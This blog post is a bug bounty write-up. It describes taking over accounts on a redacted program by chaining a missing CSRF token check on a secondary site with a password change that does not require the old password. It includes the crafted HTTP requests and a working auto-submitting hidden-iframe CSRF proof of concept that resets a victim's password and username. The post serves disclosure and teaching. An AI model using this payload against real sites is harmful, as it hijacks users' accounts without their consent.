---
layout: post
title: Account takeover chaining CSRF and weak password reset policy
subtitle: 
tags: [write-up, CSRF, high, takeaways, $swag]
comments: false
published: true
---

### Background

**A Cross-site request forgery (CSRF)**  is an attack that forces a user to execute unwanted actions on a website on which they are authenticated. In short, a request to update the user password on [https://example.com](https://example.com) could be triggered if they visit [https://evil.com](https://evil.com) **IF** the former doesn't have any CSRF protections in place. 

A CSRF protection can consist of a randomly generated value included in the HTML page that is sent with the request and checked by the server to validate the request.


### Description

This program is made of the main application and multiple secondary applications to which you can connect independently **OR** using OAuth with the main application.

I first started to look for CSRF bypass in updating account request from the main application:

```
PUT /user/edit HTTP/1.1
Host: main.redacted.com

name=nkx&city=Paris&country=FR&token=5MzcxNOMWresc09mzduKfAOYFiLnj0LdzB9SsPZfc3sfAk7tI629&password_old=old_password&password_new=new_password
```

I tried to:
  -  Remove `password_old=old_password` to see if the password could be changed without the knowledge of the current password. That didn't work.
  - Remove the CSRF token from the request => `403 Forbidden`.
  - Leave the CSRF token fempty rom the request => `403 Forbidden`.
  - Set the CSRF token to true => `403 Forbidden`.
  - Use another user's CSRF token => `403 Forbidden`.

That was a dead end. Time to move on.

I signed up for one of the secondary websites. The technologies used here looked very similar to the ones from the main site. I tried updating my profile:

```
PUT /user/edit HTTP/1.1
Host: secondary.redacted.com

username=nkx&city=Paris&country=FR&token=MEd4NzQ5Mzk3OQkB4m18_vv580eH3opIhalOOqg_Vv
```

Removing the token resulted in `200 OK` which means that a CSRF attack is possible.

Now, it seemed that I could only change personal information.
I went back to the first request and realized both requests were identical except that the second one was missing a few arguments. The ones I was interested in where `old_password` and `new_password`.

Adding those arguments resulted in resetting the password:

```
PUT /user/edit HTTP/1.1
Host: secondary.redacted.com

username=nkx&city=Paris&country=FR&password_old=old_password&password_new=new_password
```

Now I have a CSRF bypass to update the user profile but I need to know the user password. Actually what happens if I remove `old_password`? 

Strangely enough, that worked. I had achieved a full account takeover **on the main domain** chaining a CSRF protection bypass with a weak password reset method.

The last issue is that even though I was able to reset someone's password, I had no notification of this happening. I needed a way to know if a user was tricked.

Fortunately, this request also allowed me to update the username which was reflected as a slug by going to the publicly available user profile page: `https://main.redacted.com/profile/nkx`.


Final request:

```
PUT /user/edit HTTP/1.1
Host: secondary.redacted.com

username=hacked-user&city=Paris&country=FR&password_new=account_takeover
```

After a victim visit on the malicious website, I can visit `https://main.redacted.com/profile/hacked-user` to verify that the attack worked and use the new username/password combination to log in.

### Proof of concept:

Burp Suite provides a one-click proof of concept generator but I usually do not use it.
I like to provide the following proof of concept in my CSRF reports adapted from [Portswigger web security labs](https://portswigger.net/web-security/cors):

```html
<iframe hidden sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html, <body>
        <form id="csrf_form" action="https://www.secondary.redacted.com/user/edit" 
method="POST">
      <input type="submit" value="Submit request" />
      <input type="hidden" name="username" value="hacked-user" />
      <input type="hidden" name="password_new" value="account_takeover" />
    </form>
    </body>
    <script>
        document.getElementById("csrf_form").submit()
    </script>'>
</iframe>
```

This proof of concept doesn't require any user interaction except for visiting the malicious website which is a nice trick to enhance chances of the vulnerability being taken seriously by the triage team.
It might be obvious to you that this could be achieved without user interaction but it might not be for the triager.

### Takeaways

  - Identify, update, remove CSRF token on every request performing sensitive user data changes.

  - This fairly simple vulnerability arises only on the paid version of this program. After you got your first bounty, never hesitate to spend a couple of dollars to access features that have barely been touched by other hackers.

  - Always go the extra mile to make your attack scenario more plausible to maximize the chances of a successful triage.

### Summary

 - **Weakness**:
    - CSRF
    - Weak password reset policy
 - **Reward**: Swag